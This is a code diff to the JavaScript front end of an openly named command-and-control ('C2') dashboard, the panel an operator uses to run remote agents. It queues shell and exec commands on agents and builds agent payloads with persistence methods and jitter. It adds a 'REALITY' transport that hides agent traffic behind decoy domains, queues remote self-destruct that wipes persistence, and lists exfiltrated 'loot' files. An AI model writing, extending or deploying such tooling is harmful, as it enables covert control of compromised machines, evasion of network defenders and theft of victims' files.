@@ -1,74 +1,29 @@
-/**
- * C2 Project - Dashboard JavaScript v2.0
- * Handles section switching, agent control, payload building, and AJAX refresh.
- */
-
-// ─── State ───
+// Dashboard state and API operations.
 let selectedAgentId = null;
 let taskHistoryOpen = false;
 const REFRESH_INTERVAL = 5000;
-
-// ═══════════════════════════════════════════
-//  API KEY AUTH
-// ═══════════════════════════════════════════
+let buildNoticeTimer = null;
+let statsLoaded = false;
+let agentsLoaded = false;
+let agentsRefreshVersion = 0;
+let agentsAppliedVersion = 0;
+const taskCommands = new Map();
+let taskHistoryVersion = 0;
+let submissionVersion = 0;
+let terminalViewVersion = 0;
+let fileUploadInProgress = false;
 
 function apiFetch(url, options = {}) {
-    const key = sessionStorage.getItem("api_key");
-    if (!key) {
-        showAuthOverlay();
-        return Promise.reject(new Error("Not authenticated"));
-    }
-    if (!options.headers) options.headers = {};
-    if (options.headers instanceof Headers) {
-        options.headers.set("X-API-Key", key);
-    } else {
-        options.headers["X-API-Key"] = key;
-    }
     return fetch(url, options).then(res => {
         if (res.status === 401) {
-            sessionStorage.removeItem("api_key");
-            showAuthOverlay();
-            return Promise.reject(new Error("Invalid API key"));
+            window.location.assign("/login");
+            return Promise.reject(new Error("Operator session expired"));
         }
         return res;
     });
 }
 
-function showAuthOverlay() {
-    document.getElementById("auth-overlay").classList.add("visible");
-}
-
-function hideAuthOverlay() {
-    document.getElementById("auth-overlay").classList.remove("visible");
-}
-
-function submitApiKey() {
-    const input = document.getElementById("auth-key-input");
-    const error = document.getElementById("auth-error");
-    const key = input.value.trim();
-
-    if (!key) return;
-
-    error.textContent = "";
-
-    // Test the key with a lightweight endpoint
-    fetch("/api/stats", { headers: { "X-API-Key": key } })
-        .then(res => {
-            if (res.status === 401) {
-                error.textContent = "Invalid API key";
-                return;
-            }
-            sessionStorage.setItem("api_key", key);
-            hideAuthOverlay();
-            refreshAgents();
-            loadStats();
-        })
-        .catch(() => {
-            error.textContent = "Connection failed";
-        });
-}
-
-// ─── DOM References ───
+// Cached DOM references.
 const agentListEl = document.getElementById("agent-list");
 const terminalOutput = document.getElementById("terminal-output");
 const commandInput = document.getElementById("command-input");
@@ -78,25 +33,19 @@ const selectedAgentBadge = document.getElementById("selected-agent-badge");
 const taskListEl = document.getElementById("task-list");
 const refreshBtn = document.getElementById("refresh-agents");
 
-// ═══════════════════════════════════════════
-//  SECTION SWITCHING
-// ═══════════════════════════════════════════
+// Section switching.
 
 function switchSection(sectionName) {
-    // Hide all sections
     document.querySelectorAll(".section").forEach((s) => s.classList.remove("active"));
 
-    // Deactivate all nav items
     document.querySelectorAll(".nav-item").forEach((n) => n.classList.remove("active"));
 
-    // Activate selected
     const section = document.getElementById(`section-${sectionName}`);
     const navItem = document.getElementById(`nav-${sectionName}`);
 
     if (section) section.classList.add("active");
     if (navItem) navItem.classList.add("active");
 
-    // Load data for the section
     if (sectionName === "deploy") {
         loadBuilds();
         loadStagedFiles();
@@ -106,47 +55,63 @@ function switchSection(sectionName) {
     }
 }
 
-// ═══════════════════════════════════════════
-//  STATS
-// ═══════════════════════════════════════════
+// Statistics.
 
-function loadStats() {
-    apiFetch("/api/stats")
-        .then((res) => res.json())
-        .then((data) => {
-            document.getElementById("stat-agents").textContent = data.agents || 0;
-            document.getElementById("stat-pending").textContent = data.pending || 0;
-            document.getElementById("stat-completed").textContent = data.completed || 0;
-            document.getElementById("stat-builds").textContent = data.builds || 0;
-        })
-        .catch(() => { });
+function validateStats(data) {
+    if (!data || Array.isArray(data) ||
+        !["agents", "pending", "completed", "builds"].every(
+            key => Number.isSafeInteger(data[key]) && data[key] >= 0
+        )) {
+        throw new Error("Invalid statistics response");
+    }
 }
 
-// ═══════════════════════════════════════════
-//  AGENT SELECTION
-// ═══════════════════════════════════════════
+function loadStats() {
+    const status = document.getElementById("stats-status");
+    apiFetch("/api/stats")
+        .then((res) => {
+            if (!res.ok) throw new Error(`Server returned ${res.status}`);
+            return res.json();
+        })
+        .then((data) => {
+            validateStats(data);
+            document.getElementById("stat-agents").textContent = data.agents;
+            document.getElementById("stat-pending").textContent = data.pending;
+            document.getElementById("stat-completed").textContent = data.completed;
+            document.getElementById("stat-builds").textContent = data.builds;
+            statsLoaded = true;
+            status.textContent = "";
+        })
+        .catch((err) => {
+            const message = statsLoaded
+                ? "Could not refresh statistics; showing the last successful counts."
+                : "Statistics are unavailable.";
+            status.textContent = `${message} ${err.message}. Retrying automatically.`;
+        });
+}
+
+// Agent selection.
 
 function selectAgent(agentId) {
     selectedAgentId = agentId;
+    terminalViewVersion++;
+    taskHistoryVersion++;
+    taskCommands.clear();
 
-    // Update card selection
     document.querySelectorAll(".agent-card").forEach((card) => {
         card.classList.toggle("selected", card.dataset.agentId === agentId);
     });
 
-    // Enable command input
     commandInput.disabled = false;
     sendBtn.disabled = false;
-    document.getElementById("send-file-btn").disabled = false;
+    document.getElementById("send-file-btn").disabled = fileUploadInProgress;
     commandInput.placeholder = `Command for ${agentId.substring(0, 12)}…`;
     commandInput.focus();
 
-    // Update header
     interactionTitle.textContent = "Terminal";
     selectedAgentBadge.textContent = agentId.substring(0, 16) + "…";
     selectedAgentBadge.classList.add("visible");
 
-    // Clear terminal
     terminalOutput.innerHTML = `
         <div class="cmd-line">
             <span class="cmd-prompt">[system]</span>
@@ -155,21 +120,20 @@ function selectAgent(agentId) {
         <div class="cmd-status complete">● Ready for commands</div>
     `;
 
-    // Load task history
     loadTasks(agentId);
 }
 
-// ═══════════════════════════════════════════
-//  COMMAND SUBMISSION
-// ═══════════════════════════════════════════
+// Command submission.
 
-function sendCommand() {
-    if (!selectedAgentId) return;
+function sendCommand(submission = null) {
+    const agentId = submission ? submission.agentId : selectedAgentId;
+    if (!agentId) return;
+    const viewVersion = submission ? submission.viewVersion : terminalViewVersion;
+    const isCurrentView = () => agentId === selectedAgentId && viewVersion === terminalViewVersion;
 
-    let command = commandInput.value.trim();
+    let command = (submission ? submission.command : commandInput.value).trim();
     if (!command) return;
 
-    // Determine execution type from prefix
     let taskType = "exec"; // default to exec (OPSEC-safe)
     if (command.startsWith("shell ")) {
         taskType = "shell";
@@ -181,72 +145,99 @@ function sendCommand() {
 
     if (!command) return;
 
-    // Append to terminal with mode indicator
-    appendToTerminal(`
+    const submissionId = ++submissionVersion;
+    if (isCurrentView()) appendToTerminal(`
         <div class="cmd-line">
             <span class="cmd-prompt">❯ </span>
             <span class="cmd-type cmd-type-${taskType}">[${taskType}]</span>
             <span class="cmd-text">${escapeHtml(command)}</span>
         </div>
-        <div class="cmd-status pending">⏳ Pending - waiting for agent check-in…</div>
+        <div class="cmd-status pending" data-submission-id="${submissionId}">⏳ Submitting task…</div>
     `);
 
-    commandInput.value = "";
+    if (!submission) commandInput.value = "";
 
-    // Submit task
-    apiFetch("/api/task", {
+    return apiFetch("/api/task", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            agent_id: selectedAgentId,
+            agent_id: agentId,
             command: command,
             type: taskType,
         }),
     })
-        .then((res) => res.json())
-        .then((data) => {
-            if (data.task_id) {
-                pollForResult(data.task_id, command);
-                loadTasks(selectedAgentId);
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || !Number.isSafeInteger(data.task_id) || data.task_id < 1) {
+                throw new Error(data.error || `Server returned ${res.status}`);
             }
+            return data;
+        })
+        .then((data) => {
+            if (isCurrentView()) {
+                replaceSubmissionStatus(submissionId, `Task #${data.task_id} queued; check Task History for updates.`, "pending");
+                pollForResult(data.task_id, agentId, viewVersion);
+                loadTasks(agentId);
+            }
+            return {ok: true, taskId: data.task_id};
         })
         .catch((err) => {
-            appendToTerminal(`
-                <div class="cmd-output cmd-error">Error: ${escapeHtml(err.message)}</div>
-            `);
+            if (isCurrentView()) replaceSubmissionStatus(submissionId, `Task submission failed: ${err.message}`, "cmd-error");
+            return {ok: false, error: err.message};
         });
 }
 
-// ═══════════════════════════════════════════
-//  RESULT POLLING
-// ═══════════════════════════════════════════
+function replaceSubmissionStatus(submissionId, message, className) {
+    const line = terminalOutput.querySelector(`[data-submission-id="${submissionId}"]`);
+    if (line) {
+        line.className = `cmd-status ${className}`;
+        line.textContent = message;
+    }
+}
 
-function pollForResult(taskId) {
+// Result polling.
+
+function pollForResult(taskId, agentId = selectedAgentId, viewVersion = terminalViewVersion) {
+    let finished = false;
+    const isCurrentView = () => agentId === selectedAgentId && viewVersion === terminalViewVersion;
+    const stop = () => {
+        finished = true;
+        clearInterval(poll);
+        clearTimeout(timeout);
+    };
     const poll = setInterval(() => {
+        if (finished) return;
+        if (!isCurrentView()) { stop(); return; }
         apiFetch(`/api/results/${taskId}`)
             .then((res) => res.json())
             .then((data) => {
-                if (data.results && data.results.length > 0) {
-                    clearInterval(poll);
+                if (!isCurrentView()) { stop(); return; }
+                if (!finished && data.results && data.results.length > 0) {
+                    stop();
                     const output = data.results[0].output;
                     appendToTerminal(`
                         <div class="cmd-output">${escapeHtml(output)}</div>
                         <div class="cmd-status complete">✓ Complete</div>
                     `);
-                    loadTasks(selectedAgentId);
+                    loadTasks(agentId);
                     loadStats();
                 }
             })
             .catch(() => { });
     }, 2000);
 
-    // Stop after 5 min
-    setTimeout(() => clearInterval(poll), 300000);
+    // Stop displaying a live wait after 5 min; the task may still finish later.
+    const timeout = setTimeout(() => {
+        if (finished) return;
+        stop();
+        if (!isCurrentView()) return;
+        appendToTerminal(`
+            <div class="cmd-status timeout">Still waiting for task #${taskId}. Live polling stopped; check Task History for a later result.</div>
+        `);
+    }, 300000);
 }
 
-// ═══════════════════════════════════════════
-//  TASK HISTORY
-// ═══════════════════════════════════════════
+// Task history.
 
 function toggleTaskHistory() {
     taskHistoryOpen = !taskHistoryOpen;
@@ -255,21 +246,26 @@ function toggleTaskHistory() {
 }
 
 function loadTasks(agentId) {
+    const version = ++taskHistoryVersion;
     apiFetch(`/api/tasks/${agentId}`)
         .then((res) => res.json())
         .then((data) => {
+            if (version !== taskHistoryVersion || agentId !== selectedAgentId) return;
+            taskCommands.clear();
             if (!data.tasks || data.tasks.length === 0) {
                 taskListEl.innerHTML = `<div class="empty-state small"><p>No tasks yet</p></div>`;
                 return;
             }
 
+            for (const task of data.tasks) taskCommands.set(task.id, task.command);
             taskListEl.innerHTML = data.tasks
                 .map(
                     (t) => `
                 <div class="task-item" onclick="viewTaskResult(${t.id})">
                     <span class="task-id">#${t.id}</span>
                     <span class="task-command">${escapeHtml(t.command)}</span>
-                    <span class="task-status-badge ${t.status}">${t.status}</span>
+                    <span class="task-status-badge ${escapeHtml(t.status)}">${t.status === "sent" ? "Delivery uncertain" : escapeHtml(t.status)}</span>
+                    ${t.status === "sent" ? `<button class="btn-delete" onclick="event.stopPropagation(); abandonTask(${t.id})" title="Mark delivery uncertain task abandoned">Abandon</button>` : ""}
                 </div>
             `
                 )
@@ -278,15 +274,35 @@ function loadTasks(agentId) {
         .catch(() => { });
 }
 
+function abandonTask(taskId) {
+    if (!confirm("Delivery is uncertain: the agent may have executed this task. Abandon it without automatic retry? Creating a new task with the same command may execute it twice.")) return;
+    const agentId = selectedAgentId;
+    const status = document.getElementById("task-action-status");
+    status.textContent = "Marking task abandoned…";
+    apiFetch(`/api/tasks/${taskId}/abandon`, {method: "POST"})
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || data.status !== "ok") throw new Error(data.error || `Server returned ${res.status}`);
+            if (selectedAgentId === agentId) loadTasks(agentId);
+            status.textContent = `Task #${taskId} abandoned. Rerunning its command could execute it twice.`;
+        })
+        .catch((err) => { status.textContent = `Could not abandon task: ${err.message}`; });
+}
+
 function viewTaskResult(taskId) {
+    const agentId = selectedAgentId;
+    const command = taskCommands.get(taskId);
+    if (!agentId || command === undefined) return;
     apiFetch(`/api/results/${taskId}`)
         .then((res) => res.json())
         .then((data) => {
+            if (agentId !== selectedAgentId || taskCommands.get(taskId) !== command) return;
             if (data.results && data.results.length > 0) {
+                const label = command ? ` Task #${taskId}: ${escapeHtml(command)}` : ` Task #${taskId}`;
                 appendToTerminal(`
                     <div class="cmd-line">
                         <span class="cmd-prompt">[history]</span>
-                        <span class="cmd-text"> Task #${taskId}</span>
+                        <span class="cmd-text">${label}</span>
                     </div>
                     <div class="cmd-output">${escapeHtml(data.results[0].output)}</div>
                 `);
@@ -294,14 +310,24 @@ function viewTaskResult(taskId) {
         });
 }
 
-// ═══════════════════════════════════════════
-//  AGENT LIST REFRESH
-// ═══════════════════════════════════════════
+// Agent list refresh.
 
 function refreshAgents() {
+    const version = ++agentsRefreshVersion;
+    const status = document.getElementById("agents-status");
     apiFetch("/api/agents")
-        .then((res) => res.json())
+        .then((res) => {
+            if (!res.ok) throw new Error(`Server returned ${res.status}`);
+            return res.json();
+        })
         .then((data) => {
+            if (version < agentsAppliedVersion) return;
+            if (!data || !Array.isArray(data.agents) || data.agents.some(
+                a => !a || typeof a.id !== "string" || !a.id ||
+                    typeof a.hostname !== "string" || (a.os != null && typeof a.os !== "string") ||
+                    (a.last_seen != null && (typeof a.last_seen !== "string" || Number.isNaN(Date.parse(a.last_seen))))
+            )) throw new Error("Invalid agent-list response");
+            agentsAppliedVersion = version;
             if (data.agents.length === 0) {
                 agentListEl.innerHTML = `
                     <div class="empty-state" id="empty-agents">
@@ -310,6 +336,8 @@ function refreshAgents() {
                         <p class="empty-sub">Waiting for check-ins…</p>
                     </div>
                 `;
+                agentsLoaded = true;
+                status.textContent = "";
                 return;
             }
 
@@ -318,7 +346,6 @@ function refreshAgents() {
                     const isSelected = a.id === selectedAgentId ? "selected" : "";
                     const displayId = a.id.length > 12 ? a.id.substring(0, 12) + "…" : a.id;
 
-                    // Determine if agent is "alive" (last seen within 30 seconds)
                     const lastSeen = new Date(a.last_seen);
                     const now = new Date();
                     const diffSec = (now - lastSeen) / 1000;
@@ -326,31 +353,48 @@ function refreshAgents() {
                     const statusClass = isAlive ? "active" : "";
 
                     return `
-                    <div class="agent-card ${isSelected}" data-agent-id="${escapeHtml(a.id)}" onclick="selectAgent('${escapeHtml(a.id)}')">
+                    <div class="agent-card ${isSelected}" data-agent-id="${escapeHtml(a.id)}" onclick="selectAgent(${htmlStringArgument(a.id)})">
                         <div class="agent-card-top">
                             <span class="agent-status-dot ${statusClass}"></span>
                             <span class="agent-hostname">${escapeHtml(a.hostname)}</span>
                             <span class="agent-os-badge">${escapeHtml(a.os)}</span>
                         </div>
                         <div class="agent-card-bottom">
-                            <span class="agent-detail">${escapeHtml(a.ip || "N/A")}</span>
+                            ${a.transport_mode === 'reality'
+                                ? `<span class="agent-transport-badge reality" title="${escapeHtml(a.decoy_domain || 'unknown')}">🛡️ REALITY · ${escapeHtml(a.decoy_domain || 'unknown')}</span>`
+                                : a.transport_mode === 'https_pinned'
+                                    ? `<span class="agent-transport-badge tls">🔒 TLS</span> <span class="agent-detail">${escapeHtml(a.ip || 'N/A')}</span>`
+                                    : a.transport_mode === 'http'
+                                        ? `<span class="agent-detail">${escapeHtml(a.ip || 'N/A')}</span>`
+                                        : `<span class="agent-detail" title="No unique build association">Transport unknown · ${escapeHtml(a.ip || 'N/A')}</span>`
+                            }
                             <span class="agent-detail agent-id-label">${escapeHtml(displayId)}</span>
                         </div>
                         <div class="agent-card-footer">
                             <span class="agent-lastseen">Last seen: ${formatTimestamp(a.last_seen)}</span>
-                            <button class="btn-delete-agent" onclick="event.stopPropagation(); deleteAgent('${escapeHtml(a.id)}')" title="Remove agent">✕</button>
+                            <span class="agent-card-actions">
+                                <button class="btn-force-delete-agent" onclick="event.stopPropagation(); forceDeleteAgent(${htmlStringArgument(a.id)})" title="Remove server record only; does not contact the agent">Forget record</button>
+                                <button class="btn-delete-agent" onclick="event.stopPropagation(); deleteAgent(${htmlStringArgument(a.id)})" title="Queue remote self-destruct">✕</button>
+                            </span>
                         </div>
                     </div>
                 `;
                 })
                 .join("");
+            agentsLoaded = true;
+            status.textContent = "";
         })
-        .catch(() => { });
+        .catch((err) => {
+            if (version < agentsAppliedVersion) return;
+            agentsAppliedVersion = version;
+            const message = agentsLoaded
+                ? "Could not refresh agents; showing the last successful list. Status indicators may be out of date."
+                : "Agent list is unavailable.";
+            status.textContent = `${message} ${err.message}. Retrying automatically; you can also use Refresh.`;
+        });
 }
 
-// ═══════════════════════════════════════════
-//  BUILD / DEPLOY
-// ═══════════════════════════════════════════
+// Build and deployment.
 
 function buildAgent(event) {
     event.preventDefault();
@@ -358,39 +402,82 @@ function buildAgent(event) {
     const buildBtn = document.getElementById("build-btn");
     const progressEl = document.getElementById("build-progress");
     const progressText = document.getElementById("progress-text");
+    const validationStatus = document.getElementById("build-validation-status");
+    validationStatus.textContent = "";
+    const rejectInput = (message) => { validationStatus.textContent = message; };
 
     const jitterMin = parseInt(document.getElementById("build-jitter-min").value, 10);
     const jitterMax = parseInt(document.getElementById("build-jitter-max").value, 10);
+    const transportMode = document.getElementById("build-transport").value;
+    const isReality = transportMode === "reality";
 
     const config = {
         target_os: document.getElementById("build-os").value,
         arch: document.getElementById("build-arch").value,
-        server_url: document.getElementById("build-url").value.trim(),
         jitter_min: jitterMin,
         jitter_max: jitterMax,
         persist_method: document.getElementById("build-persist-method").value,
         profile_id: parseInt(document.getElementById("build-profile").value, 10),
         locale: document.getElementById("build-locale").value.trim() || "en-US,en;q=0.9",
+        transport_mode: transportMode,
     };
 
-    // Validate
-    if (!config.server_url) {
-        alert("Server URL is required");
-        return;
+    if (isReality) {
+        const vpsAddr = document.getElementById("build-vps-addr").value.trim();
+        const decoyDomain = document.getElementById("build-decoy-domain").value.trim();
+        const pubkey = document.getElementById("build-reality-pubkey").value.trim();
+        const shortid = document.getElementById("build-reality-shortid").value.trim();
+        const vlessUuid = document.getElementById("build-vless-uuid").value.trim();
+
+        if (!vpsAddr || !decoyDomain || !pubkey || !shortid || !vlessUuid) {
+            rejectInput("All REALITY fields are required: VPS Address, Decoy Domain, Public Key, Short ID, and VLESS UUID.");
+            return;
+        }
+        if (!/^.+:\d+$/.test(vpsAddr)) {
+            rejectInput("VPS Address must be in host:port format (e.g. server.example:443)");
+            return;
+        }
+        if (!/^[0-9a-fA-F]{1,16}$/.test(shortid)) {
+            rejectInput("Short ID must be a hex string (max 16 hex chars / 8 bytes)");
+            return;
+        }
+        if (!/^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(vlessUuid)) {
+            rejectInput("VLESS UUID must be a valid UUID format (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)");
+            return;
+        }
+
+        config.reality_vps_addr = vpsAddr;
+        config.decoy_domain = decoyDomain;
+        config.reality_pubkey = pubkey;
+        config.reality_shortid = shortid;
+        config.vless_uuid = vlessUuid;
+        // REALITY auto-sets server_url server-side; send a placeholder so the
+        // existing validation doesn't trip on an empty string.
+        config.server_url = "http://127.0.0.1:5000";
+    } else {
+        config.server_url = document.getElementById("build-url").value.trim();
+        if (!config.server_url) {
+            rejectInput("Server URL is required");
+            return;
+        }
     }
+
     if (isNaN(jitterMin) || isNaN(jitterMax) || jitterMin < 1 || jitterMax > 3600) {
-        alert("Jitter values must be between 1 and 3600 seconds");
+        rejectInput("Jitter values must be between 1 and 3600 seconds");
         return;
     }
     if (jitterMin >= jitterMax) {
-        alert("Jitter Min must be less than Jitter Max");
+        rejectInput("Jitter Min must be less than Jitter Max");
         return;
     }
 
-    // Show progress
+    clearTimeout(buildNoticeTimer);
+    buildNoticeTimer = null;
     buildBtn.disabled = true;
     progressEl.classList.remove("hidden");
-    progressText.textContent = `Compiling ${config.target_os}/${config.arch} agent…`;
+    progressText.style.color = "";
+    const modeLabel = isReality ? "REALITY" : transportMode === "https_pinned" ? "HTTPS+Pin" : "HTTP";
+    progressText.textContent = `Compiling ${config.target_os}/${config.arch} agent (${modeLabel})…`;
 
     apiFetch("/api/build", {
         method: "POST",
@@ -403,27 +490,31 @@ function buildAgent(event) {
                 progressText.textContent = `❌ Error: ${data.error}`;
                 progressText.style.color = "#ff5252";
                 buildBtn.disabled = false;
-                setTimeout(() => {
+                buildNoticeTimer = setTimeout(() => {
                     progressEl.classList.add("hidden");
                     progressText.style.color = "";
                 }, 5000);
                 return;
             }
 
-            // Success -> trigger download
-            const tlsTag = data.tls_pinned ? " | TLS pinned" : "";
-            progressText.textContent = `✓ Built successfully! (${formatFileSize(data.file_size)}${tlsTag})`;
+            let transportTag = "";
+            if (data.transport_mode === "reality") {
+                transportTag = " | 🛡️ REALITY";
+                if (data.decoy_domain) transportTag += ` · ${data.decoy_domain}`;
+            } else if (data.tls_pinned) {
+                transportTag = " | 🔒 TLS pinned";
+            }
+
+            progressText.textContent = `✓ Built successfully! (${formatFileSize(data.file_size)}${transportTag})`;
             progressText.style.color = "#00e676";
 
-            // Auto-download via blob for correct filename
             triggerDownload(data.build_id, data.filename || `agent_${config.target_os}_${config.arch}`);
 
-            // Refresh build list and stats
             loadBuilds();
             loadStats();
 
             buildBtn.disabled = false;
-            setTimeout(() => {
+            buildNoticeTimer = setTimeout(() => {
                 progressEl.classList.add("hidden");
                 progressText.style.color = "";
             }, 4000);
@@ -432,7 +523,7 @@ function buildAgent(event) {
             progressText.textContent = `❌ Network error: ${err.message}`;
             progressText.style.color = "#ff5252";
             buildBtn.disabled = false;
-            setTimeout(() => {
+            buildNoticeTimer = setTimeout(() => {
                 progressEl.classList.add("hidden");
                 progressText.style.color = "";
             }, 5000);
@@ -443,9 +534,13 @@ function loadBuilds() {
     const payloadList = document.getElementById("payload-list");
 
     apiFetch("/api/builds")
-        .then((res) => res.json())
+        .then((res) => {
+            if (!res.ok) throw new Error(`Server returned ${res.status}`);
+            return res.json();
+        })
         .then((data) => {
-            if (!data.builds || data.builds.length === 0) {
+            if (!Array.isArray(data.builds)) throw new Error("Invalid build-list response");
+            if (data.builds.length === 0) {
                 payloadList.innerHTML = `
                     <div class="empty-state">
                         <span class="empty-icon">📦</span>
@@ -458,23 +553,36 @@ function loadBuilds() {
 
             payloadList.innerHTML = data.builds
                 .map(
-                    (b) => `
+                    (b) => {
+                        let transportBadge = '';
+                        if (b.transport_mode === 'reality') {
+                            const domain = b.decoy_domain ? ` · ${escapeHtml(b.decoy_domain)}` : '';
+                            transportBadge = `<span class="payload-reality-badge" title="${escapeHtml(b.decoy_domain || '')}">🛡️ REALITY${domain}</span>`;
+                        } else if (b.transport_mode === 'https_pinned') {
+                            transportBadge = '<span class="payload-tls-badge">🔒 TLS</span>';
+                        } else {
+                            transportBadge = '<span class="payload-http-badge">🌐 HTTP</span>';
+                        }
+                        return `
                 <div class="payload-item">
                     <span class="payload-name">${escapeHtml(b.filename)}</span>
                     <span class="payload-os-badge">${escapeHtml(b.target_os)} / ${escapeHtml(b.arch)}</span>
-                    ${b.cert_pin ? '<span class="payload-tls-badge">🔒 TLS</span>' : ''}
+                    ${transportBadge}
                     <span class="payload-size">${formatFileSize(b.file_size)}</span>
                     <span class="payload-date">${formatTimestamp(b.created_at)}</span>
                     <div class="payload-actions">
-                        <button class="btn-download" onclick="downloadBuild(${b.id}, '${escapeHtml(b.filename)}')">⬇ Download</button>
+                        <button class="btn-download" onclick="downloadBuild(${b.id}, ${htmlStringArgument(b.filename)})">⬇ Download</button>
                         <button class="btn-delete" onclick="deleteBuild(${b.id})">✕</button>
                     </div>
                 </div>
-            `
+            `;
+                    }
                 )
                 .join("");
         })
-        .catch(() => { });
+        .catch((err) => {
+            payloadList.innerHTML = `<p class="list-error" role="alert">Unable to load builds: ${escapeHtml(err.message)}. Use Refresh to retry.</p>`;
+        });
 }
 
 function downloadBuild(buildId, filename) {
@@ -482,8 +590,13 @@ function downloadBuild(buildId, filename) {
 }
 
 function triggerDownload(buildId, filename) {
+    const status = document.getElementById("download-status");
+    status.textContent = "Downloading…";
     apiFetch(`/api/builds/download/${buildId}`)
-        .then((res) => res.blob())
+        .then((res) => {
+            if (!res.ok) throw new Error(`Server returned ${res.status}`);
+            return res.blob();
+        })
         .then((blob) => {
             const url = window.URL.createObjectURL(blob);
             const a = document.createElement("a");
@@ -493,30 +606,51 @@ function triggerDownload(buildId, filename) {
             a.click();
             document.body.removeChild(a);
             window.URL.revokeObjectURL(url);
+            status.textContent = "Download sent to your browser.";
         })
-        .catch(() => { });
+        .catch((err) => {
+            status.textContent = `Download failed: ${err.message}. You can retry using Download.`;
+        });
 }
 
 function deleteBuild(buildId) {
     if (!confirm("Delete this payload?")) return;
 
+    const status = document.getElementById("build-action-status");
+    status.textContent = "Deleting build…";
     apiFetch(`/api/builds/${buildId}`, { method: "DELETE" })
-        .then((res) => res.json())
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok) throw new Error(data.error || `Server returned ${res.status}`);
+            return data;
+        })
         .then(() => {
+            status.textContent = "Build deleted.";
             loadBuilds();
             loadStats();
         })
-        .catch(() => { });
+        .catch((err) => {
+            status.textContent = `Build deletion failed: ${err.message}`;
+        });
 }
 
 function deleteAgent(agentId) {
     if (!confirm("⚠ DESTROY AGENT?\n\nThis will remotely wipe the agent from the host:\n• Remove persistence (scheduled task/registry/cron/systemd)\n• Delete the agent binary\n• Agent will self-destruct on next check-in\n\nContinue?")) return;
 
-    apiFetch(`/api/agents/${agentId}`, { method: "DELETE" })
-        .then((res) => res.json())
+    const status = document.getElementById("agents-action-status");
+    status.textContent = "Queuing self-destruct…";
+    apiFetch(`/api/agents/${encodeURIComponent(agentId)}`, { method: "DELETE" })
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || data.status !== "ok") {
+                throw new Error(data.error || `Server returned ${res.status}`);
+            }
+            return data;
+        })
         .then((data) => {
-            // Visually mark the card as destroying
-            const card = document.querySelector(`.agent-card[data-agent-id="${agentId}"]`);
+            status.textContent = "Self-destruct queued for the next agent check-in.";
+            const card = [...document.querySelectorAll(".agent-card")]
+                .find((item) => item.dataset.agentId === agentId);
             if (card) {
                 card.style.opacity = "0.4";
                 card.style.borderColor = "#ff5252";
@@ -524,7 +658,6 @@ function deleteAgent(agentId) {
                 if (footer) footer.textContent = "⏳ Self-destruct queued…";
             }
 
-            // Show in terminal if this agent is selected
             if (selectedAgentId === agentId) {
                 appendToTerminal(`
                     <div class="cmd-line">
@@ -536,12 +669,43 @@ function deleteAgent(agentId) {
 
             loadStats();
         })
-        .catch(() => { });
+        .catch((err) => {
+            status.textContent = `Could not queue self-destruct: ${err.message}`;
+        });
 }
 
-// ═══════════════════════════════════════════
-//  HELPERS
-// ═══════════════════════════════════════════
+function forceDeleteAgent(agentId) {
+    if (!confirm("Forget this agent's server record and its task/results history? This does NOT remove anything from the agent's host.")) return;
+    const status = document.getElementById("agents-action-status");
+    status.textContent = "Removing server record…";
+    apiFetch(`/api/agents/${encodeURIComponent(agentId)}/force`, { method: "DELETE" })
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || data.status !== "ok") {
+                throw new Error(data.error || `Server returned ${res.status}`);
+            }
+            if (selectedAgentId === agentId) {
+                selectedAgentId = null;
+                taskHistoryVersion++;
+                taskCommands.clear();
+                commandInput.disabled = true;
+                sendBtn.disabled = true;
+                document.getElementById("send-file-btn").disabled = true;
+                selectedAgentBadge.textContent = "";
+                selectedAgentBadge.classList.remove("visible");
+                terminalOutput.innerHTML = "";
+                taskListEl.innerHTML = "";
+            }
+            status.textContent = "Server record removed. This did not contact or erase the agent.";
+            refreshAgents();
+            loadStats();
+        })
+        .catch((err) => {
+            status.textContent = `Could not remove server record: ${err.message}`;
+        });
+}
+
+// Rendering helpers.
 
 function appendToTerminal(html) {
     const welcome = terminalOutput.querySelector(".terminal-welcome");
@@ -552,10 +716,13 @@ function appendToTerminal(html) {
 }
 
 function escapeHtml(text) {
-    if (!text) return "";
-    const div = document.createElement("div");
-    div.textContent = text;
-    return div.innerHTML;
+    const entities = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
+    return String(text ?? "").replace(/[&<>"']/g, (character) => entities[character]);
+}
+
+// Inline handler arguments need JavaScript string encoding before HTML escaping.
+function htmlStringArgument(value) {
+    return escapeHtml(JSON.stringify(String(value ?? "")));
 }
 
 function formatFileSize(bytes) {
@@ -573,7 +740,12 @@ function formatFileSize(bytes) {
 function formatTimestamp(ts) {
     if (!ts) return "-";
     try {
-        const d = new Date(ts);
+        // SQLite CURRENT_TIMESTAMP is UTC but does not include a timezone suffix.
+        const sqliteTimestamp = /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}(?:\.\d+)?$/;
+        const normalized = typeof ts === "string" && sqliteTimestamp.test(ts)
+            ? ts.replace(" ", "T") + "Z" : ts;
+        const d = new Date(normalized);
+        if (Number.isNaN(d.getTime())) return "-";
         const now = new Date();
         const diffMs = now - d;
         const diffSec = Math.floor(diffMs / 1000);
@@ -588,9 +760,7 @@ function formatTimestamp(ts) {
     }
 }
 
-// ═══════════════════════════════════════════
-//  LOOT (Exfiltrated Files)
-// ═══════════════════════════════════════════
+// Collected files.
 
 let lootOpen = false;
 
@@ -606,9 +776,13 @@ function toggleLoot() {
 function loadLoot() {
     const lootList = document.getElementById("loot-list");
     apiFetch("/api/loot")
-        .then((res) => res.json())
+        .then((res) => {
+            if (!res.ok) throw new Error(`Server returned ${res.status}`);
+            return res.json();
+        })
         .then((data) => {
-            if (!data.loot || data.loot.length === 0) {
+            if (!data || !Array.isArray(data.loot)) throw new Error("Invalid file-list response");
+            if (data.loot.length === 0) {
                 lootList.innerHTML = `<div class="empty-state small"><p>No files exfiltrated yet</p></div>`;
                 return;
             }
@@ -630,12 +804,17 @@ function loadLoot() {
                 )
                 .join("");
         })
-        .catch(() => { });
+        .catch((err) => {
